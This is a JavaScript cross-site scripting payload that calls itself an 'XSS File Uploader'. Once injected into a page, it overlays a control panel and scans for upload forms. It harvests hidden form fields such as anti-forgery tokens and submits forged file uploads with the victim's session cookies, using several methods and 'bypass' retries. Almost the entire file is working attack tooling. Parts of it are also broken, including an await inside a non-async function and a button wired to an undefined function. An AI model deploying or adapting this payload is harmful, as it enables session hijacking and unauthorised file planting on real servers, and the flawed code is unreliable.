document.write(`
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
background:#1e1e1e;border:3px solid #00ff00;padding:20px;z-index:999999;
width:600px;font-family:monospace;color:#00ff00;box-shadow:0 0 20px #000;max-height:80vh;overflow:auto;">
    
    <h3>📁 XSS File Uploader (502 Debug Edition)</h3>
    
    <!-- Scan and Debug Row -->
    <div style="display:flex;gap:5px;margin:10px 0;">
        <button onclick="scanForms()" style="background:#00ff00;color:#000;padding:8px;flex:1">🔍 Scan Forms</button>
        <button onclick="debugCORS()" style="background:#ffff00;color:#000;padding:8px;flex:1">🌐 Test CORS</button>
        <button onclick="debug502()" style="background:#ff0000;color:#fff;padding:8px;flex:1">🔍 Debug 502</button>
    </div>
    
    <div id="scanResult" style="background:#000;padding:5px;margin:5px 0;font-size:12px;max-height:100px;overflow:auto;border:1px solid #00ff00;">Ready</div>
    
    <!-- Upload Configuration -->
    <input id="uploadUrl" placeholder="Upload URL (full URL including https://)" value="https://target-server.com/upload.php" style="width:100%;margin:5px 0;padding:8px;background:#333;color:#0f0;border:1px solid #0f0;">
    <input id="fieldName" placeholder="Field name (e.g., file, upload, image)" value="file" style="width:100%;margin:5px 0;padding:8px;background:#333;color:#0f0;border:1px solid #0f0;">
    
    <!-- File Selection -->
    <div style="border:2px solid #00ff00;padding:15px;margin:15px 0;">
        <strong style="font-size:16px;">📂 SELECT FILE FROM YOUR LAPTOP:</strong>
        <input type="file" id="localFile" style="margin:15px 0;color:#00ff00;width:100%;padding:5px;">
        <div id="fileInfo" style="font-size:12px;background:#000;padding:5px;"></div>
    </div>
    
    <!-- Main Upload Methods -->
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;margin:10px 0;">
        <button onclick="uploadViaForm()" style="background:#00ff00;color:#000;padding:10px;font-weight:bold;">🚀 Form Method</button>
        <button onclick="uploadViaFetch()" style="background:#ffaa00;color:#000;padding:10px;font-weight:bold;">🌐 Fetch Method</button>
        <button onclick="uploadDirect()" style="background:#ff00ff;color:#fff;padding:10px;font-weight:bold;">📤 Direct Submit</button>
        <button onclick="uploadViaIframe()" style="background:#0088ff;color:#fff;padding:10px;font-weight:bold;">🖼️ Iframe Only</button>
    </div>
    
    <!-- Advanced/Testing Methods -->
    <div style="margin:10px 0;">
        <details>
            <summary style="background:#333;padding:8px;cursor:pointer;color:#0f0;">🔧 Advanced Debug Tools</summary>
            <div style="padding:10px;background:#2a2a2a;">
                <button onclick="testTinyFile()" style="background:#00ff00;color:#000;padding:8px;width:100%;margin:2px 0;">🧪 Test with Tiny File</button>
                <button onclick="uploadWithEncoding()" style="background:#ff8800;color:#000;padding:8px;width:100%;margin:2px 0;">🔄 Try Different Encodings</button>
                <button onclick="uploadChunked()" style="background:#8800ff;color:#fff;padding:8px;width:100%;margin:2px 0;">📦 Chunked Upload</button>
                <button onclick="testServerConnection()" style="background:#ff66aa;color:#000;padding:8px;width:100%;margin:2px 0;">🌍 Test Server Connection</button>
                <button onclick="bypass502()" style="background:#ff0000;color:#fff;padding:8px;width:100%;margin:2px 0;">⚡ Bypass 502 Attempt</button>
            </div>
        </details>
    </div>
    
    <!-- Status/Output Area -->
    <div id="status" style="background:#000;padding:15px;margin-top:15px;min-height:150px;max-height:300px;overflow:auto;font-size:12px;border:2px solid #00ff00;white-space:pre-wrap;font-family:monospace;">Ready - Select a file and try uploading</div>
    
    <!-- Info -->
    <div style="font-size:10px;color:#666;margin-top:10px;text-align:center;">
        ⚠️ If upload fails, check console (F12) for errors | Ctrl+Enter to upload
    </div>
</div>
`);

// ==================== FILE SELECTION HANDLER ====================
document.getElementById('localFile').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if(file) {
        document.getElementById('fileInfo').innerHTML = 
            `✅ Selected: ${file.name} (${(file.size/1024).toFixed(2)} KB) | Type: ${file.type || 'unknown'}`;
    } else {
        document.getElementById('fileInfo').innerHTML = '';
    }
});

// ==================== SCAN FORMS ====================
window.scanForms = function() {
    let results = '🔍 SCANNING FORMS...\n';
    let found = 0;
    
    document.querySelectorAll('form').forEach((f, index) => {
        const fileInput = f.querySelector('input[type="file"]');
        if(fileInput) {
            found++;
            const action = f.action || '[same page]';
            const method = f.method || 'GET';
            const enctype = f.enctype || 'application/x-www-form-urlencoded';
            results += `✅ Form #${index}: action="${action}" method="${method}" enctype="${enctype}" field="${fileInput.name}"\n`;
            
            // Auto-fill if found
            if(found === 1) {
                document.getElementById('uploadUrl').value = action || '/upload.php';
                document.getElementById('fieldName').value = fileInput.name || 'file';
            }
        }
    });
    
    if(found === 0) {
        results += '❌ No file upload forms found on this page\n';
    }
    
    document.getElementById('scanResult').innerText = results;
};

// ==================== DEBUG 502 ====================
window.debug502 = async function() {
    const url = document.getElementById('uploadUrl').value;
    const status = document.getElementById('status');
    
    if(!url) {
        alert('Please enter a URL first');
        return;
    }
    
    status.innerText = '🔍 DEBUGGING 502 ERROR\n' +
                      '=====================\n\n';
    
    // Step 1: DNS Resolution
    status.innerText += '1. Checking DNS resolution...\n';
    try {
        const urlObj = new URL(url);
        status.innerText += `   Hostname: ${urlObj.hostname}\n`;
        status.innerText += `   Protocol: ${urlObj.protocol}\n`;
        status.innerText += `   Path: ${urlObj.pathname}\n`;
    } catch(e) {
        status.innerText += `   ❌ Invalid URL: ${e.message}\n`;
    }
    
    // Step 2: Basic Connectivity
    status.innerText += '\n2. Testing basic connectivity...\n';
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        const response = await fetch(url, { 
            method: 'HEAD',
            mode: 'no-cors',
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        status.innerText += `   ✅ Server is reachable\n`;
    } catch(e) {
        status.innerText += `   ❌ Cannot reach server: ${e.message}\n`;
    }
    
    // Step 3: Check Server Headers
    status.innerText += '\n3. Checking server headers...\n';
    try {
        const response = await fetch(url, { 
            method: 'OPTIONS',
            mode: 'cors'
        });
        status.innerText += `   Status: ${response.status}\n`;
        const headers = {};
        response.headers.forEach((value, key) => {
            headers[key] = value;
            status.innerText += `   ${key}: ${value}\n`;
        });
    } catch(e) {
        status.innerText += `   ❌ Cannot get headers: ${e.message}\n`;
    }
    
    // Step 4: Test GET Request
    status.innerText += '\n4. Testing GET request...\n';
    try {
        const response = await fetch(url + '?test=' + Date.now(), {
            method: 'GET',
            mode: 'cors'
        });
        status.innerText += `   Status: ${response.status}\n`;
        if(response.status === 502) {
            status.innerText += `   ⚠️ Server returns 502 for GET - server problem!\n`;
        }
        const text = await response.text().catch(() => 'Cannot read response');
        status.innerText += `   Response preview: ${text.substring(0, 100)}\n`;
    } catch(e) {
        status.innerText += `   ❌ GET failed: ${e.message}\n`;
    }
    
    // Step 5: Check Common Issues
    status.innerText += '\n5. Common 502 Causes:\n';
    status.innerText += '   • File too large for server\n';
    status.innerText += '   • PHP timeout exceeded\n';
    status.innerText += '   • Nginx/Apache misconfiguration\n';
    status.innerText += '   • Proxy/Cloudflare issues\n';
    status.innerText += '   • Server overloaded\n';
};

// ==================== UPLOAD VIA FORM (ORIGINAL FILENAME PRESERVED) ====================
window.uploadViaForm = function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerText = `📤 FORM METHOD UPLOAD\n` +
                      `====================\n\n` +
                      `URL: ${url}\n` +
                      `File: ${file.name} (${(file.size/1024).toFixed(2)} KB)\n` +
                      `Field: ${fieldName}\n` +
                      `\n⏳ Submitting...\n`;
    
    const uploadId = 'upload_' + Date.now();
    
    // Create iframe
    const iframe = document.createElement('iframe');
    iframe.name = uploadId;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    // Create form with proper encoding
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'multipart/form-data';
    form.target = uploadId;
    
    // Move original file input (preserves filename)
    const parent = fileInput.parentNode;
    const nextSibling = fileInput.nextSibling;
    
    fileInput.remove();
    fileInput.name = fieldName;
    fileInput.style.display = 'none';
    form.appendChild(fileInput);
    
    // Add hidden fields from existing forms
    document.querySelectorAll('form input[type="hidden"]').forEach(input => {
        if(input.name) {
            const hidden = document.createElement('input');
            hidden.type = 'hidden';
            hidden.name = input.name;
            hidden.value = input.value;
            form.appendChild(hidden);
        }
    });
    
    // Handle iframe load
    iframe.onload = function() {
        try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            const response = iframeDoc.body.innerHTML;
            status.innerText += `\n✅ UPLOAD COMPLETE\n`;
            status.innerText += `Response: ${response.substring(0, 500)}...\n`;
        } catch(e) {
            status.innerText += `\n✅ Form submitted (cross-origin - check server)\n`;
        }
        
        // Clean up
        setTimeout(() => {
            if(document.body.contains(iframe)) document.body.removeChild(iframe);
            
            // Restore file input
            if(parent) {
                if(nextSibling) {
                    parent.insertBefore(fileInput, nextSibling);
                } else {
                    parent.appendChild(fileInput);
                }
            }
            fileInput.style.display = 'block';
        }, 1000);
    };
    
    // Submit
    document.body.appendChild(form);
    setTimeout(() => {
        form.submit();
        setTimeout(() => {
            if(document.body.contains(form)) document.body.removeChild(form);
        }, 100);
    }, 100);
};

// ==================== UPLOAD VIA FETCH ====================
window.uploadViaFetch = async function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerText = `🌐 FETCH METHOD UPLOAD\n` +
                      `=====================\n\n` +
                      `URL: ${url}\n` +
                      `File: ${file.name}\n` +
                      `\n⏳ Uploading...\n`;
    
    const formData = new FormData();
    formData.append(fieldName, file);
    
    // Add hidden fields
    document.querySelectorAll('form input[type="hidden"]').forEach(input => {
        if(input.name) formData.append(input.name, input.value);
    });
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
            mode: 'cors',
            credentials: 'include'
        });
        
        status.innerText += `\n📡 Response Status: ${response.status}\n`;
        
        const text = await response.text();
        status.innerText += `\n📄 Response:\n${text.substring(0, 500)}\n`;
        
        if(response.ok) {
            status.innerText += `\n✅ Upload successful!\n`;
        } else {
            status.innerText += `\n❌ Upload failed\n`;
        }
    } catch(error) {
        status.innerText += `\n❌ Error: ${error.message}\n`;
        status.innerText += `\n💡 This is likely a CORS error. Try Form Method.\n`;
    }
};

// ==================== DIRECT SUBMIT (NEW WINDOW) ====================
window.uploadDirect = function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerText = `📤 DIRECT SUBMIT\n` +
                      `================\n\n` +
                      `Opening new window/tab for upload...\n` +
                      `File: ${file.name}\n`;
    
    // Create form
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'multipart/form-data';
    form.target = '_blank';
    
    // Move file input
    const parent = fileInput.parentNode;
    const nextSibling = fileInput.nextSibling;
    
    fileInput.remove();
    fileInput.name = fieldName;
    form.appendChild(fileInput);
    
    // Add hidden fields
    document.querySelectorAll('form input[type="hidden"]').forEach(input => {
        if(input.name) {
            const hidden = document.createElement('input');
            hidden.type = 'hidden';
            hidden.name = input.name;
            hidden.value = input.value;
            form.appendChild(hidden);
        }
    });
    
    // Submit
    document.body.appendChild(form);
    form.submit();
    
    // Restore file input
    if(parent) {
        if(nextSibling) {
            parent.insertBefore(fileInput, nextSibling);
        } else {
            parent.appendChild(fileInput);
        }
    }
    fileInput.style.display = 'block';
    document.body.removeChild(form);
    
    status.innerText += `✅ Form opened in new tab/window\n`;
};

// ==================== IFRAME ONLY ====================
window.uploadViaIframe = function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    iframeDoc.open();
    iframeDoc.write(`
        <html>
        <body>
            <form method="POST" action="${url}" enctype="multipart/form-data" id="uploadForm">
                <input type="file" name="${fieldName}" id="fileInput">
                ${Array.from(document.querySelectorAll('form input[type="hidden"]')).map(input => 
                    `<input type="hidden" name="${input.name}" value="${input.value}">`
                ).join('')}
            </form>
            <script>
                const fileInput = document.getElementById('fileInput');
                const file = new File([${JSON.stringify(Array.from(new Uint8Array(await fileInput.files[0].arrayBuffer())))}], "${file.name}");
                const dataTransfer = new DataTransfer();
                dataTransfer.items.add(file);
                fileInput.files = dataTransfer.files;
                document.getElementById('uploadForm').submit();
            <\/script>
        </body>
        </html>
    `);
    iframeDoc.close();
    
    status.innerText = `Iframe upload attempted`;
};

// ==================== TEST TINY FILE ====================
window.testTinyFile = function() {
    const tinyContent = 'XSS Test Payload: ' + Date.now();
    const tinyFile = new File([tinyContent], 'test.txt', { type: 'text/plain' });
    
    const fileInput = document.getElementById('localFile');
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(tinyFile);
    fileInput.files = dataTransfer.files;
    
    document.getElementById('fileInfo').innerHTML = 
        `✅ Created test file: test.txt (${tinyContent.length} bytes) - Click upload now!`;
    
    document.getElementById('status').innerText = 
        `🧪 TEST FILE CREATED\n` +
        `==================\n\n` +
        `File: test.txt\n` +
        `Size: ${tinyContent.length} bytes\n` +
        `Content: "${tinyContent}"\n\n` +
        `Click one of the upload methods above to test.`;
};

// ==================== DIFFERENT ENCODINGS ====================
window.uploadWithEncoding = function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerText = `🔄 TESTING DIFFERENT ENCODINGS\n` +
                      `============================\n\n`;
    
    const encodings = [
        { type: 'multipart/form-data', name: 'Standard' },
        { type: 'application/x-www-form-urlencoded', name: 'URL Encoded' },
        { type: 'text/plain', name: 'Plain Text' }
    ];
    
    let attemptCount = 0;
    
    encodings.forEach((encoding, index) => {
        setTimeout(() => {
            attemptCount++;
            status.innerText += `\n📤 Attempt ${attemptCount}: ${encoding.name}\n`;
            
            const iframe = document.createElement('iframe');
            iframe.name = 'enc_' + Date.now() + '_' + index;
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = url;
            form.enctype = encoding.type;
            form.target = iframe.name;
            
            if(encoding.type === 'multipart/form-data') {
                // For multipart, we need the actual file
                const parent = fileInput.parentNode;
                const nextSibling = fileInput.nextSibling;
                
                fileInput.remove();
                fileInput.name = fieldName;
                form.appendChild(fileInput);
                
                setTimeout(() => {
                    if(parent) {
                        if(nextSibling) {
                            parent.insertBefore(fileInput, nextSibling);
                        } else {
                            parent.appendChild(fileInput);
                        }
                    }
                }, 2000);
            } else {
                // For other encodings, send file metadata
                const nameInput = document.createElement('input');
                nameInput.type = 'text';
                nameInput.name = fieldName + '_name';
                nameInput.value = file.name;
                form.appendChild(nameInput);
                
                const sizeInput = document.createElement('input');
                sizeInput.type = 'text';
                sizeInput.name = fieldName + '_size';
                sizeInput.value = file.size;
                form.appendChild(sizeInput);
                
                const contentInput = document.createElement('input');
                contentInput.type = 'text';
                contentInput.name = fieldName + '_type';
                contentInput.value = file.type;
                form.appendChild(contentInput);
            }
            
            iframe.onload = function() {
                try {
                    const response = iframe.contentDocument.body.innerHTML;
                    status.innerText += `✅ Response (${encoding.name}): ${response.substring(0, 100)}...\n`;
                } catch(e) {
                    status.innerText += `✅ Form submitted (${encoding.name})\n`;
                }
                setTimeout(() => document.body.removeChild(iframe), 1000);
            };
            
            document.body.appendChild(form);
            setTimeout(() => {
                form.submit();
                setTimeout(() => document.body.removeChild(form), 100);
            }, 100);
            
        }, index * 3000);
    });
};

// ==================== CHUNKED UPLOAD ====================
window.uploadChunked = async function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const file = fileInput.files[0];
    const chunkSize = 256 * 1024; // 256KB chunks (smaller to avoid timeouts)
    const chunks = Math.ceil(file.size / chunkSize);
    
    const status = document.getElementById('status');
    status.innerText = `📦 CHUNKED UPLOAD\n` +
                      `================\n\n` +
                      `File: ${file.name}\n` +
                      `Total size: ${(file.size/1024).toFixed(2)} KB\n` +
                      `Chunk size: ${chunkSize/1024} KB\n` +
                      `Total chunks: ${chunks}\n\n`;
    
    for(let i = 0; i < chunks; i++) {
        const start = i * chunkSize;
        const end = Math.min(start + chunkSize, file.size);
        const chunk = file.slice(start, end);
        
        const formData = new FormData();
        formData.append(fieldName, chunk, `${file.name}.part${i}`);
        formData.append('chunk_index', i);
        formData.append('total_chunks', chunks);
        formData.append('original_filename', file.name);
        formData.append('total_size', file.size);
        
        status.innerText += `📤 Uploading chunk ${i+1}/${chunks} (${((end-start)/1024).toFixed(2)} KB)...\n`;
        
        try {
            const response = await fetch(url + '?chunked=1', {
                method: 'POST',
                body: formData,
                mode: 'cors',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
            
            if(response.ok) {
                status.innerText += `✅ Chunk ${i+1} complete\n`;
            } else {
                status.innerText += `❌ Chunk ${i+1} failed: ${response.status}\n`;
                break;
            }
        } catch(e) {
            status.innerText += `❌ Chunk ${i+1} error: ${e.message}\n`;
            break;
        }
        
        // Small delay between chunks
        await new Promise(r => setTimeout(r, 500));
    }
    
    status.innerText += `\n✅ Chunked upload process complete\n`;
};

// ==================== TEST SERVER CONNECTION ====================
window.testServerConnection = async function() {
    const url = document.getElementById('uploadUrl').value;
    const status = document.getElementById('status');
    
    status.innerText = `🌍 TESTING SERVER CONNECTION\n` +
                      `===========================\n\n`;
    
    const tests = [
        { method: 'HEAD', desc: 'Basic connectivity' },
        { method: 'OPTIONS', desc: 'CORS preflight' },
        { method: 'GET', desc: 'GET request' }
    ];
    
    for(const test of tests) {
        status.innerText += `Testing ${test.desc}...\n`;
        try {
            const response = await fetch(url, { method: test.method });
            status.innerText += `✅ ${test.method}: ${response.status}\n`;
        } catch(e) {
            status.innerText += `❌ ${test.method}: ${e.message}\n`;
        }
    }
    
    // Test with small payload
    status.innerText += `\nTesting with small POST...\n`;
    try {
        const formData = new FormData();
        formData.append('test', 'ping');
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        status.innerText += `✅ POST test: ${response.status}\n`;
    } catch(e) {
        status.innerText += `❌ POST test: ${e.message}\n`;
    }
};

// ==================== BYPASS 502 ATTEMPT ====================
window.bypass502 = async function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerText = `⚡ 502 BYPASS ATTEMPT\n` +
                      `====================\n\n` +
                      `Trying multiple bypass techniques...\n\n`;
    
    // Technique 1: Add random query parameter
    status.innerText += `1. Adding random parameter...\n`;
    const urlWithParam = url + (url.includes('?') ? '&' : '?') + '_=' + Date.now();
    
    // Technique 2: Use different Content-Type
    status.innerText += `2. Trying different headers...\n`;
    
    const formData = new FormData();
    formData.append(fieldName, file);
    formData.append('bypass', 'true');
    
    try {
        const response = await fetch(urlWithParam, {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '*/*',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        });
        
        status.innerText += `📡 Response: ${response.status}\n`;
        const text = await response.text();
        status.innerText += `Response preview: ${text.substring(0, 200)}\n`;
    } catch(e) {
        status.innerText += `❌ Error: ${e.message}\n`;
    }
    
    // Technique 3: Try as base64
    status.innerText += `\n3. Trying base64 encoding...\n`;
    const reader = new FileReader();
    reader.onload = async function(e) {
        const base64 = e.target.result.split(',')[1];
        const formData2 = new FormData();
        formData2.append(fieldName + '_base64', base64);
        formData2.append('filename', file.name);
        formData2.append('filesize', file.size);
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData2
            });
            status.innerText += `📡 Base64 response: ${response.status}\n`;
        } catch(e) {
            status.innerText += `❌ Base64 error: ${e.message}\n`;
        }
    };
    reader.readAsDataURL(file);
};

// ==================== KEYBOARD SHORTCUT ====================
document.addEventListener('keydown', function(e) {
    if(e.ctrlKey && e.key === 'Enter') {
        e.preventDefault();
        uploadViaForm();
    }
});

// ==================== AUTO-SCAN ====================
setTimeout(scanForms, 1000);

console.log('🚀 XSS File Uploader loaded - Press Ctrl+Enter to upload');
